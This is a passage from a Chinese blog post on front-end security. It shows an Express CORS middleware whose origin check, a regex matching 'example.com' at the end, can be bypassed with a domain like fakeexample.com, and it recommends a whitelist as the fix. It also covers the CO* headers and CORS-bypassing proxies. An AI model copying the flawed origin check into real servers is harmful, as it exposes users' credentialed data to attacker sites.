<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">app<span class="hljs-selector-class">.use</span>((req, res, next) =&gt; &#123;<br>  res<span class="hljs-selector-class">.headers</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;Access-Control-Allow-Credentials&#x27;</span>]</span> = <span class="hljs-string">&#x27;true&#x27;</span><br>  const origin = req<span class="hljs-selector-class">.headers</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;Origin&#x27;</span>]</span><br><br>  <span class="hljs-comment">// 偵測是不是 example.com 結尾</span><br>  <span class="hljs-keyword">if</span> (/example\.com$/<span class="hljs-selector-class">.test</span>(origin)) &#123;<br>    res<span class="hljs-selector-class">.headers</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;Access-Control-Allow-Origin&#x27;</span>]</span> = origin<br>  &#125;<br>&#125;)<br></code></pre></td></tr></table></figure>

来看这种 限制了以example.com 结尾  

但是很容易绕过  

例如 fakeexample.com  

这些都是因为配置策略问题  

解决办法也很简单 直接设置白名单  

##### 其他的标头  

除了我们熟悉的 CORS 之外，还有几个以 CO 开头的标头：

1. CORB (Cross-Origin Read Blocking)
   CORB（跨源读取阻止）
2. CORP (Cross-Origin Resource Policy)
   CORP（跨域资源策略）
3. COEP (Cross-Origin-Embedder-Policy)
   COEP（跨源嵌入器策略）
4. COOP (Cross-Origin-Opener-Policy)
   COOP（跨源开启者策略）

![image-20250122104632194](https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202501221046573.png)  

#### proxy server  

不断提醒大家，同源政策什么的都只是「浏览器的限制」，一旦脱离了浏览器，就没有任何限制了，proxy server 就是如此。  

![image-20250214132809514](https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202502141328728.png)

由于 proxy server 不是浏览器  所以不会受到 浏览器上面 才有的cors限制  

有一个项目  

https://github.com/Rob--W/cors-anywhere/  

CORS Anywhere 提供了一个 **代理服务**，你可以通过它来 **绕过浏览器的 CORS 限制**。它的工作原理是，当你想跨域请求某个资源时，先向 CORS Anywhere 服务器发送请求，CORS Anywhere 服务器再代替你发起请求到目标资源的服务器，并在响应中添加适当的 CORS 头部，最后将响应返回给你。这样，浏览器就能正确处理这个跨域请求，因为它接收到了目标服务器允许跨域访问的数据。  

![image-20250214133454390](https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202502141334587.png)


                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div></div>
      <div>http://example.com/2025/05/03/前端安全/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>John Doe</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2025年5月3日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/05/02/hello-world/" title="Hello World">
                        <span class="hidden-mobile">Hello World</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
